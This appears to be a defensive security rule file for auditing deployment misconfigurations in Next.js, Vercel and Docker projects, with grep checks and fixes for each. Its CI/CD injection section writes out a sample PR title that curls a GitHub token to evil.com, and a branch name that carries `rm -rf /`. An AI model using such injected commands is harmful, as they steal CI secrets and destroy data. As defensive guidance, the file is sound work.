---
domain: deployment
version: 1.0.0
stacks: []
always_load: true
owasp: [A05]
priority: [data-breach, disruption]
---

## Quick Check

1. `grep -rn 'productionBrowserSourceMaps' next.config.* 2>/dev/null || echo "OK: not set (defaults to false)"`
2. `ls -la .git/HEAD 2>/dev/null && echo "WARNING: .git present in deploy directory" || echo "OK: .git not in deploy dir"`
3. `grep -rn 'Content-Security-Policy\|Strict-Transport-Security\|X-Frame-Options\|X-Content-Type-Options' next.config.* vercel.json netlify.toml middleware.* 2>/dev/null || echo "WARNING: no security headers found"`
4. `grep -rn 'VERCEL_ENV\|NEXT_PUBLIC_VERCEL_ENV' .env.production .env.preview vercel.json 2>/dev/null; echo "Check: production and preview envs should use separate keys"`
5. `grep -rn 'DEBUG=true\|NODE_ENV=development\|NODE_ENV=\"development\"\|NODE_ENV='\''development'\''' .env.production Dockerfile docker-compose.yml docker-compose.prod.yml 2>/dev/null`
6. `grep -rn 'stack\|stackTrace\|err\.message\|error\.message' --include='*.{ts,js,tsx,jsx}' . | grep -v node_modules | grep -i 'res\.\(json\|send\|status\)' | head -20`
7. `grep -rn 'Access-Control-Allow-Origin.*\*' next.config.* vercel.json middleware.* --include='*.{ts,js,tsx,jsx}' . 2>/dev/null | grep -v node_modules | head -10`

## Full Patterns

### Source Maps in Production
**Vulnerability:** Source Maps Exposed in Production Build
**Severity:** High
**Detect:** Check `next.config.js` / `next.config.mjs` for `productionBrowserSourceMaps: true`. Check if `.map` files are served in production by inspecting build output or requesting `/_next/static/chunks/*.map`.
**Impact:** Entire application source code — including business logic, API routes, internal comments, and potentially hardcoded values — is exposed to anyone who opens browser DevTools or requests `.map` files directly.
**Fix:**
```diff
// next.config.js
module.exports = {
-  productionBrowserSourceMaps: true,
+  productionBrowserSourceMaps: false, // or remove entirely (defaults to false)
}
```
If you need source maps for error tracking (Sentry, Datadog), upload them server-side during build and do not serve them publicly. Use `sentry-webpack-plugin` or equivalent to upload maps then delete them from the build output.
**OWASP:** A05

### .git Directory Accessible
**Vulnerability:** Git Repository Exposed in Production Deployment
**Severity:** High
**Detect:** Check if `/.git/HEAD` is accessible in production: request `https://yourdomain.com/.git/HEAD`. If it returns `ref: refs/heads/main` (or similar), the entire repository is exposed. Also check `/.git/config` for remote URLs. Common on static hosts, Docker deployments, or misconfigured Nginx/Apache serving the project root.
**Impact:** Full source code, commit history, branch names, and — critically — any secrets ever committed and later removed are all accessible. Tools like `git-dumper` can reconstruct the entire repository from a publicly accessible `.git` directory.
**Fix:**
```nginx
# Nginx — block .git access
location ~ /\.git {
    deny all;
    return 404;
}
```
```dockerfile
# Docker — don't copy .git into image
COPY --chown=node:node . .
# Add .dockerignore:
# .git
# .gitignore
```
Ensure your deployment tool (Vercel, Netlify, Docker) excludes `.git` from the deploy artifact. Add `.git` to `.dockerignore`. For static hosts, add deny rules for `/.git` paths.
**OWASP:** A05

### Missing Security Headers
**Vulnerability:** Missing HTTP Security Headers in Production
**Severity:** Medium
**Detect:** Check response headers in production using `curl -I https://yourdomain.com`. Look for absence of: `Content-Security-Policy`, `Strict-Transport-Security`, `X-Frame-Options`, `X-Content-Type-Options`, `Referrer-Policy`, `Permissions-Policy`. Check `next.config.js`, `vercel.json`, `middleware.ts`, or reverse proxy config for header definitions.
**Impact:** Missing CSP allows XSS attacks to load arbitrary scripts. Missing HSTS allows SSL stripping. Missing X-Frame-Options allows clickjacking. Missing X-Content-Type-Options allows MIME sniffing attacks.
**Fix:**
```js
// next.config.js
const securityHeaders = [
  { key: 'Content-Security-Policy', value: "default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' data: https:; font-src 'self'; connect-src 'self' https://api.yourdomain.com; frame-ancestors 'none';" },
  { key: 'Strict-Transport-Security', value: 'max-age=63072000; includeSubDomains; preload' },
  { key: 'X-Frame-Options', value: 'DENY' },
  { key: 'X-Content-Type-Options', value: 'nosniff' },
  { key: 'Referrer-Policy', value: 'strict-origin-when-cross-origin' },
  { key: 'Permissions-Policy', value: 'camera=(), microphone=(), geolocation=(), interest-cohort=()' },
];

module.exports = {
  async headers() {
    return [{ source: '/(.*)', headers: securityHeaders }];
  },
};
```
Tailor CSP to your application. Start with `Content-Security-Policy-Report-Only` to identify violations before enforcing. Add `report-uri` or `report-to` to collect violations.
**OWASP:** A05

### Debug Mode in Production
**Vulnerability:** Debug Mode or Development Settings Active in Production
**Severity:** High
**Detect:** Grep for `DEBUG=true`, `NODE_ENV=development`, `NEXT_PUBLIC_DEBUG`, or `verbose: true` in production environment configs (`.env.production`, Dockerfile, `docker-compose.prod.yml`, CI deploy scripts). Check for debug middleware or endpoints like `/debug`, `/test`, `/_debug`, `/api/debug`. Check for `app.use(errorHandler)` that returns stack traces.
**Impact:** Debug mode exposes stack traces with file paths and line numbers, internal variable states, database query details, and sometimes full request/response dumps. Attackers use this information to map application internals and craft targeted exploits.
**Fix:**
```diff
# .env.production
- DEBUG=true
- NODE_ENV=development
+ NODE_ENV=production

# Remove debug endpoints before production deploy
- app.get('/debug', (req, res) => res.json({ env: process.env }));
```
Ensure `NODE_ENV=production` in all production deployments. Remove or gate debug endpoints behind authentication. Use structured logging (Pino, Winston) that writes to log aggregation services, not to HTTP responses.
**OWASP:** A05

### Preview Deployments Using Production Keys
**Vulnerability:** Vercel/Netlify Preview Branches Running with Production Credentials
**Severity:** Critical
**Detect:** Check if Vercel environment variables distinguish between `production` and `preview` environments. In Vercel dashboard or `vercel.json`, check if `STRIPE_SECRET_KEY`, `DATABASE_URL`, or other sensitive vars are scoped to "Production" only or shared across all environments. Check for `VERCEL_ENV` usage in code.
**Impact:** Every pull request gets a preview deployment. If preview deployments use production Stripe keys, production database credentials, or production email service keys, any contributor (or automated bot opening a PR) can trigger actions against live systems — including charging real cards, modifying production data, or sending emails to real users.
**Fix:**
```json
// vercel.json — scope env vars by environment
// Use Vercel dashboard: Settings > Environment Variables
// Set each sensitive var's scope:
// - STRIPE_SECRET_KEY → Production only
// - DATABASE_URL → Production only (use staging DB for Preview)
// - SENDGRID_API_KEY → Production only
```
```ts
// In code, verify environment
if (process.env.VERCEL_ENV === 'preview') {
  // Use test/sandbox keys, connect to staging DB
}
```
Create separate Stripe test keys, staging databases, and sandbox service accounts for preview deployments. Never share production credentials with preview environments.
**OWASP:** A05

### CDN Cache Poisoning
**Vulnerability:** CDN Cache Poisoning via Host Header Manipulation
**Severity:** Medium
**Detect:** Check if the application uses the `Host` header to generate URLs, links, or redirects. Test by sending a request with a spoofed `Host: evil.com` header and checking if the response includes `evil.com` in any URLs or meta tags. Check if the CDN caches responses keyed only on path (not Host header).
**Impact:** An attacker sends a request with a malicious `Host` header. If the server uses the Host header in response content (e.g., canonical URLs, redirect targets, asset URLs) and the CDN caches this response, all subsequent users receive the poisoned response. This enables phishing, script injection via manipulated asset URLs, and SEO poisoning.
**Fix:**
```ts
// Validate Host header in middleware
const ALLOWED_HOSTS = ['yourdomain.com', 'www.yourdomain.com'];

export function middleware(request: NextRequest) {
  const host = request.headers.get('host');
  if (!ALLOWED_HOSTS.includes(host)) {
    return new NextResponse('Invalid host', { status: 400 });
  }
}
```
Configure your CDN to include the `Host` header in the cache key, or — better — validate the Host header at the application layer and reject unexpected values. Never use `req.headers.host` to construct URLs; use a hardcoded base URL from environment variables instead.
**OWASP:** A05

### CI/CD Pipeline Injection
**Vulnerability:** Command Injection via PR Metadata in CI/CD Pipelines
**Severity:** High
**Detect:** Check CI workflow files (`.github/workflows/*.yml`) for use of `${{ github.event.pull_request.title }}`, `${{ github.event.pull_request.body }}`, `${{ github.head_ref }}` (branch name), or `${{ github.event.issue.title }}` directly in `run:` steps. These are user-controlled inputs that can contain shell metacharacters.
**Impact:** An attacker creates a PR with a title like `` `curl http://evil.com/steal?token=$GITHUB_TOKEN` `` or a branch name containing `; rm -rf /`. If the CI script interpolates this value into a shell command, it executes arbitrary code with access to CI secrets, deployment credentials, and artifact signing keys.
**Fix:**
```diff
# .github/workflows/ci.yml
- run: echo "PR title: ${{ github.event.pull_request.title }}"
+ run: echo "PR title: $PR_TITLE"
+   env:
+     PR_TITLE: ${{ github.event.pull_request.title }}
```
Never use `${{ }}` expressions directly in `run:` blocks — assign them to environment variables first (the shell will treat them as data, not code). For branch name validation, add a regex check step before any scripts that use the branch name. Use `actions/github-script` for complex logic instead of shell interpolation.
**OWASP:** A05

### Subdomain Takeover
**Vulnerability:** Dangling DNS CNAME Records Pointing to Deprovisioned Services
**Severity:** Medium
**Detect:** List all DNS CNAME records for your domain. Check if the target service still exists. Common indicators: CNAME pointing to `*.herokuapp.com`, `*.azurewebsites.net`, `*.s3.amazonaws.com`, `*.ghost.io`, `*.shopify.com`, `*.surge.sh`, `*.netlify.app` where the target resource has been deleted. Tools: `dig CNAME subdomain.yourdomain.com`, `subfinder`, `subjack`.
**Impact:** An attacker registers the deprovisioned service (e.g., creates a new Heroku app matching the old CNAME target) and now controls content served on your subdomain. This enables phishing under your domain, cookie theft (if cookies are scoped to `*.yourdomain.com`), and bypassing CSP rules that trust your domain.
**Fix:**
```bash
# Audit DNS records
dig CNAME staging.yourdomain.com  # If NXDOMAIN at target, it is vulnerable

# Fix: remove the dangling CNAME
# In your DNS provider, delete the CNAME record for the deprovisioned subdomain
```
Maintain an inventory of all DNS records and the services they point to. When deprovisioning a service, remove the DNS record first (or simultaneously). Scope cookies to the specific subdomain, not `*.yourdomain.com`. Audit CNAME records quarterly.
**OWASP:** A05

### Docker Secrets in Dockerfile
**Vulnerability:** Secrets Embedded in Docker Image via ARG, ENV, or COPY
**Severity:** Critical
**Detect:** Check Dockerfile for `ARG` or `ENV` instructions containing secret values. Check for `COPY .env .` or `COPY . .` without a `.dockerignore` that excludes `.env`. Check if multi-stage builds leak secrets from build stages into the final image. Run `docker history --no-trunc <image>` to inspect all layers for embedded secrets.
**Impact:** Docker images contain every layer as a recoverable artifact. Even if you delete a secret in a later layer, it persists in the image history. Anyone who pulls the image (from a registry, CI artifacts, or a compromised host) can extract all secrets from any layer. `docker history --no-trunc` reveals ARG and ENV values in plaintext.
**Fix:**
```dockerfile
# BAD — secret visible in image history
ARG STRIPE_SECRET_KEY
ENV DATABASE_URL=postgres://admin:secret@db:5432/app
COPY .env .

# GOOD — use build secrets (Docker BuildKit)
# syntax=docker/dockerfile:1
RUN --mount=type=secret,id=db_url \
    export DATABASE_URL=$(cat /run/secrets/db_url) && \
    npm run migrate

# .dockerignore
.env
.env.*
.git
```
Use Docker BuildKit secrets (`--mount=type=secret`) for build-time secrets. Use Docker Swarm secrets or Kubernetes secrets for runtime. Never use `ARG` or `ENV` for secrets. Always create a `.dockerignore` excluding `.env`, `.env.*`, `.git`, and `node_modules`.
**OWASP:** A05

### Verbose Error Messages to Client
**Vulnerability:** Stack Traces and Internal Error Details Returned in API Responses
**Severity:** Medium
**Detect:** Check error handling middleware and API route catch blocks for patterns that return `error.message`, `error.stack`, `err.toString()`, or the full error object in HTTP responses. Check for `app.use((err, req, res, next) => res.json({ error: err }))` patterns. Test by triggering errors (invalid input, missing resources) and inspecting the response body.
**Impact:** Stack traces reveal internal file paths, framework versions, database types, ORM query structures, and third-party service names. Attackers use this to identify vulnerable dependency versions, map internal architecture, and craft targeted injection payloads.
**Fix:**
```ts
// API error handler
export function errorHandler(err: Error, req: Request, res: Response, next: NextFunction) {
  // Log full error for debugging
  logger.error({ err, requestId: req.id }, 'Unhandled error');

  // Return generic error to client
  if (process.env.NODE_ENV === 'production') {
    res.status(500).json({ error: 'Internal server error', requestId: req.id });
  } else {
    res.status(500).json({ error: err.message, stack: err.stack });
  }
}
```
Always return generic error messages in production. Include a `requestId` so support can correlate user reports with server logs. Log the full error server-side with structured logging. Use error tracking services (Sentry, Datadog) to capture full stack traces without exposing them to clients.
**OWASP:** A05

### CORS Wildcard on Authenticated Endpoints
**Vulnerability:** Access-Control-Allow-Origin: * on Endpoints Requiring Authentication
**Severity:** High
**Detect:** Check CORS configuration in `next.config.js`, `vercel.json`, middleware, or API route handlers for `Access-Control-Allow-Origin: *`. Specifically check if this wildcard is applied to routes that read cookies, session tokens, or Authorization headers. Check for `cors({ origin: '*' })` or manual header setting. Note: browsers block `Access-Control-Allow-Credentials: true` with wildcard origin, but misconfigured servers may reflect the request Origin header instead.
**Impact:** A wildcard CORS policy on authenticated endpoints allows any website to make cross-origin requests to your API. While browsers prevent credential-bearing requests with `*` origin, a common misconfiguration is reflecting the request's `Origin` header as `Access-Control-Allow-Origin` combined with `Access-Control-Allow-Credentials: true` — this effectively allows any site to make authenticated requests on behalf of your users.
**Fix:**
```ts
// middleware.ts or API route
const ALLOWED_ORIGINS = [
  'https://yourdomain.com',
  'https://app.yourdomain.com',
];

export function middleware(request: NextRequest) {
  const origin = request.headers.get('origin');
  const response = NextResponse.next();

  if (ALLOWED_ORIGINS.includes(origin)) {
    response.headers.set('Access-Control-Allow-Origin', origin);
    response.headers.set('Access-Control-Allow-Credentials', 'true');
  }
  // If origin not in allowlist, do NOT set any CORS headers — browser will block

  response.headers.set('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS');
  response.headers.set('Access-Control-Allow-Headers', 'Content-Type, Authorization');
  return response;
}
```
Use an explicit allowlist of origins. Never reflect the request `Origin` header without validation. For public APIs that don't use cookies/sessions, wildcard is acceptable. For authenticated endpoints, always restrict to known origins. See also domain `08-api-security` for broader CORS patterns.
**OWASP:** A05
